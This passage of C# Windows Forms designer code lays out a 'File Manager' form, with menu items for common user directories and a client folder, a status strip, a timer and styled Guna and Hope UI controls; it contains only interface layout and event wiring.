        this.toolStripMenuItem15.Name = "toolStripMenuItem15";
        this.toolStripMenuItem15.Size = new System.Drawing.Size(180, 22);
        this.toolStripMenuItem15.Text = "UnZip";
        this.toolStripMenuItem16.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.toolStripMenuItem17, this.toolStripMenuItem18, this.toolStripMenuItem19, this.toolStripMenuItem20 });
        this.toolStripMenuItem16.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.toolStripMenuItem16.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem16.Image");
        this.toolStripMenuItem16.Name = "toolStripMenuItem16";
        this.toolStripMenuItem16.Size = new System.Drawing.Size(139, 22);
        this.toolStripMenuItem16.Text = "Directories";
        this.toolStripMenuItem17.BackColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.toolStripMenuItem17.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.toolStripMenuItem17.Name = "toolStripMenuItem17";
        this.toolStripMenuItem17.Size = new System.Drawing.Size(180, 22);
        this.toolStripMenuItem17.Text = "Desktop";
        this.toolStripMenuItem17.Click += new System.EventHandler(DESKTOPToolStripMenuItem_Click);
        this.toolStripMenuItem18.BackColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.toolStripMenuItem18.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.toolStripMenuItem18.Name = "toolStripMenuItem18";
        this.toolStripMenuItem18.Size = new System.Drawing.Size(180, 22);
        this.toolStripMenuItem18.Text = "AppData";
        this.toolStripMenuItem18.Click += new System.EventHandler(APPDATAToolStripMenuItem_Click);
        this.toolStripMenuItem19.BackColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.toolStripMenuItem19.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.toolStripMenuItem19.Name = "toolStripMenuItem19";
        this.toolStripMenuItem19.Size = new System.Drawing.Size(180, 22);
        this.toolStripMenuItem19.Text = "User Profile";
        this.toolStripMenuItem19.Click += new System.EventHandler(UserProfileToolStripMenuItem_Click);
        this.toolStripMenuItem20.BackColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.toolStripMenuItem20.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.toolStripMenuItem20.Name = "toolStripMenuItem20";
        this.toolStripMenuItem20.Size = new System.Drawing.Size(180, 22);
        this.toolStripMenuItem20.Text = "Drivers";
        this.toolStripMenuItem20.Click += new System.EventHandler(DriversListsToolStripMenuItem_Click);
        this.openClientFolderToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.openClientFolderToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("openClientFolderToolStripMenuItem.Image");
        this.openClientFolderToolStripMenuItem.Name = "openClientFolderToolStripMenuItem";
        this.openClientFolderToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
        this.openClientFolderToolStripMenuItem.Text = "Client folder";
        this.openClientFolderToolStripMenuItem.Click += new System.EventHandler(OpenClientFolderToolStripMenuItem_Click);
        this.imageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList1.ImageStream");
        this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
        this.imageList1.Images.SetKeyName(0, "folder.ico");
        this.imageList1.Images.SetKeyName(1, "icons8-hdd-48 (1).png");
        this.imageList1.Images.SetKeyName(2, "AsyncUSB.png");
        this.statusStrip1.AutoSize = false;
        this.statusStrip1.BackColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.statusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
        this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.toolStripStatusLabel1, this.toolStripStatusLabel2, this.toolStripStatusLabel3 });
        this.statusStrip1.Location = new System.Drawing.Point(0, 447);
        this.statusStrip1.Name = "statusStrip1";
        this.statusStrip1.Padding = new System.Windows.Forms.Padding(1, 0, 9, 0);
        this.statusStrip1.Size = new System.Drawing.Size(849, 21);
        this.statusStrip1.SizingGrip = false;
        this.statusStrip1.TabIndex = 2;
        this.statusStrip1.Text = "statusStrip1";
        this.toolStripStatusLabel1.ForeColor = System.Drawing.Color.White;
        this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
        this.toolStripStatusLabel1.Size = new System.Drawing.Size(13, 16);
        this.toolStripStatusLabel1.Text = "..";
        this.toolStripStatusLabel2.ForeColor = System.Drawing.Color.White;
        this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
        this.toolStripStatusLabel2.Size = new System.Drawing.Size(13, 16);
        this.toolStripStatusLabel2.Text = "..";
        this.toolStripStatusLabel3.ForeColor = System.Drawing.Color.Red;
        this.toolStripStatusLabel3.Name = "toolStripStatusLabel3";
        this.toolStripStatusLabel3.Size = new System.Drawing.Size(13, 16);
        this.toolStripStatusLabel3.Text = "..";
        this.timer1.Interval = 1000;
        this.timer1.Tick += new System.EventHandler(Timer1_Tick);
        this.hopeForm1.BackColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.hopeForm1.ControlBoxColorH = System.Drawing.Color.FromArgb(228, 231, 237);
        this.hopeForm1.ControlBoxColorHC = System.Drawing.Color.FromArgb(245, 108, 108);
        this.hopeForm1.ControlBoxColorN = System.Drawing.Color.LightGray;
        this.hopeForm1.Cursor = System.Windows.Forms.Cursors.Default;
        this.hopeForm1.Dock = System.Windows.Forms.DockStyle.Top;
        this.hopeForm1.Font = new System.Drawing.Font("Segoe UI", 12f);
        this.hopeForm1.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.hopeForm1.Image = (System.Drawing.Image)resources.GetObject("hopeForm1.Image");
        this.hopeForm1.Location = new System.Drawing.Point(0, 0);
        this.hopeForm1.MaximizeBox = false;
        this.hopeForm1.Name = "hopeForm1";
        this.hopeForm1.Size = new System.Drawing.Size(849, 40);
        this.hopeForm1.TabIndex = 3;
        this.hopeForm1.Text = "File Manager";
        this.hopeForm1.ThemeColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.panel1.BackColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.panel1.Controls.Add(this.guna2Button1);
        this.panel1.Controls.Add(this.guna2Button6);
        this.panel1.Dock = System.Windows.Forms.DockStyle.Top;
        this.panel1.EdgeColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.panel1.Location = new System.Drawing.Point(0, 40);
        this.panel1.Name = "panel1";
        this.panel1.Padding = new System.Windows.Forms.Padding(5);
        this.panel1.Size = new System.Drawing.Size(849, 29);
        this.panel1.SmoothingType = System.Drawing.Drawing2D.SmoothingMode.HighQuality;
        this.panel1.TabIndex = 4;
        this.panel1.Text = "panel1";
        this.guna2Elipse1.BorderRadius = 30;
        this.guna2Elipse1.TargetControl = this;
        this.guna2Button6.Animated = true;
        this.guna2Button6.BackColor = System.Drawing.Color.Transparent;
        this.guna2Button6.BorderRadius = 4;
        this.guna2Button6.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.guna2Button6.FillColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.guna2Button6.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2Button6.ForeColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.guna2Button6.Image = (System.Drawing.Image)resources.GetObject("guna2Button6.Image");
        this.guna2Button6.ImageSize = new System.Drawing.Size(25, 25);
        this.guna2Button6.Location = new System.Drawing.Point(2, -2);
        this.guna2Button6.Name = "guna2Button6";
        this.guna2Button6.Size = new System.Drawing.Size(44, 31);
        this.guna2Button6.TabIndex = 53;
        this.guna2Button6.UseTransparentBackground = true;
        this.guna2Button6.Click += new System.EventHandler(backToolStripMenuItem_Click);
        this.guna2Button1.Animated = true;
        this.guna2Button1.BackColor = System.Drawing.Color.Transparent;
        this.guna2Button1.BorderRadius = 4;
        this.guna2Button1.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.guna2Button1.FillColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.guna2Button1.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2Button1.ForeColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.guna2Button1.Image = (System.Drawing.Image)resources.GetObject("guna2Button1.Image");
        this.guna2Button1.ImageSize = new System.Drawing.Size(25, 25);
        this.guna2Button1.Location = new System.Drawing.Point(797, -2);
        this.guna2Button1.Name = "guna2Button1";
        this.guna2Button1.Size = new System.Drawing.Size(44, 31);
        this.guna2Button1.TabIndex = 54;
        this.guna2Button1.UseTransparentBackground = true;
        this.guna2Button1.Click += new System.EventHandler(rEFRESHToolStripMenuItem_Click);
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.FromArgb(64, 64, 64);
        base.ClientSize = new System.Drawing.Size(849, 468);
        base.Controls.Add(this.listView1);
        base.Controls.Add(this.panel1);
        base.Controls.Add(this.hopeForm1);
        base.Controls.Add(this.statusStrip1);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Margin = new System.Windows.Forms.Padding(2);
        base.MaximizeBox = false;
        this.MaximumSize = new System.Drawing.Size(1920, 1080);
        this.MinimumSize = new System.Drawing.Size(190, 40);
        base.Name = "FormFileManager";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "File Manager";
        base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormFileManager_FormClosed);
        base.Load += new System.EventHandler(FormFileManager_Load);
        this.contextMenuStrip1.ResumeLayout(false);
        this.statusStrip1.ResumeLayout(false);
        this.statusStrip1.PerformLayout();
        this.panel1.ResumeLayout(false);
        base.ResumeLayout(false);
    }
}